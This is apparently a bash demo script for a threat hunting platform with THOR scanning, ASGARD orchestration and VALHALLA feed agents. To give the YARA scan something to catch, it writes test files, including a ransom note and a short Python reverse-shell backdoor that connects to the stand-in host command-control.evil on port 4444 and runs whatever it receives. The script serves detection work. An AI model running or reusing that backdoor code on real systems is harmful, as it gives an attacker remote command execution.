#!/bin/bash
# Threat Hunting Platform - Interactive Demo Script
# This script demonstrates the THOR, ASGARD, and VALHALLA agents in action
# Designed for video recording with asciinema

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# Configuration
DEMO_DIR="$HOME/threat-hunting-test"
INSTANCE_NAME="xdgaisocapp01"
ZONE="asia-southeast2-a"
PROJECT_ID="chronicle-dev-2be9"
PAUSE_TIME=2

# Helper functions
print_header() {
    echo ""
    echo -e "${BOLD}${CYAN}========================================${NC}"
    echo -e "${BOLD}${WHITE}$1${NC}"
    echo -e "${BOLD}${CYAN}========================================${NC}"
    echo ""
    sleep $PAUSE_TIME
}

print_step() {
    echo -e "${BOLD}${GREEN}▶ $1${NC}"
    sleep 1
}

print_info() {
    echo -e "${BLUE}ℹ $1${NC}"
}

print_success() {
    echo -e "${GREEN}✓ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}⚠ $1${NC}"
}

print_error() {
    echo -e "${RED}✗ $1${NC}"
}

type_command() {
    echo -e "${MAGENTA}$ ${NC}$1"
    sleep 1
}

execute_demo_command() {
    type_command "$1"
    eval "$1"
    echo ""
    sleep $PAUSE_TIME
}

# Main demo script
main() {
    clear

    # Introduction
    print_header "AI-Driven SOC - Threat Hunting Platform Demo"
    echo -e "${WHITE}This demo showcases the Nextron-style threat hunting platform${NC}"
    echo -e "${WHITE}featuring THOR, ASGARD, and VALHALLA agents.${NC}"
    echo ""
    echo -e "${CYAN}Components:${NC}"
    echo -e "  ${GREEN}•${NC} THOR      - Endpoint scanning agent"
    echo -e "  ${GREEN}•${NC} ASGARD    - Campaign orchestration"
    echo -e "  ${GREEN}•${NC} VALHALLA  - Threat intelligence feeds"
    echo ""
    sleep 3

    # Demo Part 1: Environment Setup
    print_header "Part 1: Environment Overview"

    print_step "Navigating to threat hunting directory"
    execute_demo_command "cd $DEMO_DIR"

    print_step "Checking directory structure"
    execute_demo_command "tree -L 2 -d . 2>/dev/null || find . -maxdepth 2 -type d | head -20"

    print_step "Listing threat hunting agents"
    execute_demo_command "ls -lh *_agent.py *_manager.py"

    print_step "Activating Python virtual environment"
    execute_demo_command "source venv/bin/activate"

    print_step "Checking installed packages"
    execute_demo_command "pip list | grep -E '(google-cloud|yara|psutil)'"

    # Demo Part 2: VALHALLA Threat Intelligence
    print_header "Part 2: VALHALLA - Threat Intelligence Feed Manager"

    print_info "VALHALLA aggregates threat intelligence from multiple sources"
    print_info "and distributes YARA rules and IOCs to THOR agents"
    echo ""

    print_step "Checking VALHALLA configuration"
    execute_demo_command "cat config/valhalla_config.json | python3 -m json.tool | head -30"

    print_step "Viewing available YARA rules"
    if [ -d "data/yara_rules" ]; then
        execute_demo_command "ls -lh data/yara_rules/"
        print_step "Examining a YARA rule"
        execute_demo_command "cat data/yara_rules/test_malware_rules.yar | head -30"
    else
        print_warning "No YARA rules found - would fetch from threat feeds in production"
    fi

    # Demo Part 3: THOR Endpoint Scanning
    print_header "Part 3: THOR - Endpoint Scanning Agent"

    print_info "THOR performs comprehensive endpoint scans using YARA rules,"
    print_info "IOC matching, and behavioral analysis"
    echo ""

    print_step "Viewing THOR configuration"
    execute_demo_command "cat config/thor_config.json | python3 -m json.tool | head -40"

    print_step "Creating test malware samples"
    mkdir -p data/test_malware

    cat > data/test_malware/suspicious_ransomware.txt << 'EOF'
This is a test file containing ransomware indicators.
Your files have been encrypted!
Send 1 BTC to decrypt your files.
All your data is now encrypted with AES-256.
Contact: decryptor@ransomware.evil
EOF

    cat > data/test_malware/suspicious_backdoor.txt << 'EOF'
import socket
import subprocess
# Backdoor connection
s = socket.socket()
s.connect(("command-control.evil", 4444))
while True:
    cmd = s.recv(1024)
    subprocess.call(cmd, shell=True)
EOF

    print_success "Created test malware samples"
    execute_demo_command "ls -lh data/test_malware/"

    print_step "Running THOR filesystem scan on test directory"
    type_command "python thor_endpoint_agent.py --config config/thor_config.json --scan-type filesystem --target data/test_malware --load-yara"

    # Run actual scan (with output formatting)
    echo ""
    python3 thor_endpoint_agent.py --config config/thor_config.json --scan-type filesystem --target data/test_malware --load-yara 2>&1 | grep -E "(Scan|Found|Match|threat|INFO|WARNING|ERROR)" || echo "Scan completed"
    echo ""
    sleep 3

    print_step "Running THOR process scan"
    type_command "python thor_endpoint_agent.py --config config/thor_config.json --scan-type process"
    echo ""
    python3 thor_endpoint_agent.py --config config/thor_config.json --scan-type process 2>&1 | head -20
    echo ""
    sleep 2

    # Demo Part 4: ASGARD Orchestration
    print_header "Part 4: ASGARD - Campaign Orchestration"

    print_info "ASGARD manages fleet-wide threat hunting campaigns,"
    print_info "coordinating scans across multiple endpoints"
    echo ""

    print_step "Viewing ASGARD configuration"
    execute_demo_command "cat config/asgard_config.json | python3 -m json.tool | head -50"

    print_step "Checking registered endpoints"
    type_command "python -c \"from asgard_orchestration_agent import ASGARDOrchestrationAgent; a = ASGARDOrchestrationAgent(); print(f'Registered endpoints: {len(a.registered_endpoints)}'); [print(f'  - {e.hostname} ({e.ip_address})') for e in a.registered_endpoints]\""
    python3 -c "
import sys
sys.path.insert(0, '.')
from asgard_orchestration_agent import ASGARDOrchestrationAgent
a = ASGARDOrchestrationAgent()
print(f'Registered endpoints: {len(a.registered_endpoints)}')
for e in a.registered_endpoints:
    print(f'  - {e.hostname} ({e.ip_address}) - Status: {e.status}')
" 2>/dev/null || echo "No endpoints registered yet"
    echo ""
    sleep 2

    print_step "Viewing available campaign templates"
    execute_demo_command "cat config/asgard_config.json | python3 -m json.tool | grep -A 10 'campaign_templates'"

    # Demo Part 5: Integration
    print_header "Part 5: End-to-End Integration"

    print_info "Complete threat hunting workflow:"
    echo -e "  ${GREEN}1.${NC} VALHALLA updates threat intelligence feeds"
    echo -e "  ${GREEN}2.${NC} ASGARD creates and distributes campaign"
    echo -e "  ${GREEN}3.${NC} THOR agents scan endpoints with latest rules"
    echo -e "  ${GREEN}4.${NC} Results aggregated and analyzed"
    echo ""
    sleep 3

    print_step "Checking GCP integration status"
    echo -e "${CYAN}Pub/Sub Topics:${NC}"
    echo "  • thor-scan-requests - Scan task distribution"
    echo "  • thor-findings - Threat detection results"
    echo "  • asgard-campaigns - Campaign management"
    echo "  • valhalla-rule-updates - Rule synchronization"
    echo ""

    echo -e "${CYAN}BigQuery Tables:${NC}"
    echo "  • soc_data.thor_scan_results - Historical scan data"
    echo "  • soc_data.asgard_campaign_reports - Campaign analytics"
    echo ""
    sleep 3

    print_step "Viewing system architecture"
    cat << 'EOF'

    ┌─────────────────────────────────────────────────┐
    │         VALHALLA Feed Manager                   │
    │  ┌───────────┐  ┌───────────┐  ┌───────────┐   │
    │  │ ThreatFox │  │ Malware   │  │ Emerging  │   │
    │  │   IOCs    │  │  Bazaar   │  │ Threats   │   │
    │  └─────┬─────┘  └─────┬─────┘  └─────┬─────┘   │
    │        └───────────────┴───────────────┘         │
    │                 YARA Rules + IOCs                │
    └─────────────────────┬───────────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────────┐
    │         ASGARD Orchestration                    │
    │                                                  │
    │  Campaign: "Ransomware Hunt Q1 2026"            │
    │  Targets: Production Endpoints                  │
    │  Rules: ransomware, crypto_malware              │
    │                                                  │
    │           Scan Task Distribution                │
    └─────────────────────┬───────────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────────┐
    │         THOR Endpoint Agents (Fleet)            │
    │  ┌──────────┐  ┌──────────┐  ┌──────────┐      │
    │  │ Server1  │  │ Server2  │  │ Server N │      │
    │  │YARA Scan │  │YARA Scan │  │YARA Scan │      │
    │  │IOC Match │  │IOC Match │  │IOC Match │      │
    │  └────┬─────┘  └────┬─────┘  └────┬─────┘      │
    │       └─────────────┴──────────────┘             │
    │              Threat Findings                     │
    └─────────────────────┬───────────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────────┐
    │       AI-Driven SOC Agent Ecosystem             │
    │  TAA (Triage) → CRA (Response) → CLA (Learn)   │
    └─────────────────────────────────────────────────┘

EOF
    sleep 4

    # Demo Part 6: Summary and Next Steps
    print_header "Demo Summary"

    echo -e "${BOLD}${GREEN}✓ Demonstrated Components:${NC}"
    echo -e "  ${GREEN}•${NC} VALHALLA threat intelligence aggregation"
    echo -e "  ${GREEN}•${NC} THOR endpoint scanning capabilities"
    echo -e "  ${GREEN}•${NC} ASGARD campaign orchestration"
    echo -e "  ${GREEN}•${NC} GCP cloud-native integration"
    echo ""

    echo -e "${BOLD}${CYAN}Key Features:${NC}"
    echo -e "  ${GREEN}•${NC} Multi-source threat intelligence"
    echo -e "  ${GREEN}•${NC} YARA rule-based detection"
    echo -e "  ${GREEN}•${NC} IOC matching across endpoints"
    echo -e "  ${GREEN}•${NC} Fleet-wide orchestration"
    echo -e "  ${GREEN}•${NC} Real-time threat hunting"
    echo -e "  ${GREEN}•${NC} Cloud-native scalability"
    echo ""

    echo -e "${BOLD}${YELLOW}Production Deployment Steps:${NC}"
    echo -e "  ${YELLOW}1.${NC} Create GCP resources (Pub/Sub, BigQuery, GCS)"
    echo -e "  ${YELLOW}2.${NC} Configure threat intelligence API keys"
    echo -e "  ${YELLOW}3.${NC} Deploy THOR agents on endpoints"
    echo -e "  ${YELLOW}4.${NC} Register endpoints with ASGARD"
    echo -e "  ${YELLOW}5.${NC} Launch threat hunting campaigns"
    echo ""

    echo -e "${BOLD}${CYAN}Integration with AI-Driven SOC:${NC}"
    echo -e "  ${GREEN}•${NC} THOR findings → TAA (Triage Agent) for enrichment"
    echo -e "  ${GREEN}•${NC} Critical threats → CRA (Response Agent) for containment"
    echo -e "  ${GREEN}•${NC} Detection patterns → CLA (Learning Agent) for ML training"
    echo ""

    print_success "Demo completed successfully!"
    echo ""
    echo -e "${BOLD}${WHITE}For more information:${NC}"
    echo -e "  • Documentation: THREAT_HUNTING_README.md"
    echo -e "  • Deployment Guide: docs/GCP_THREAT_HUNTING_DEPLOYMENT.md"
    echo -e "  • GitHub: https://github.com/ghifiardi/ai-driven-soc"
    echo ""
}

# Run the demo
main "$@"
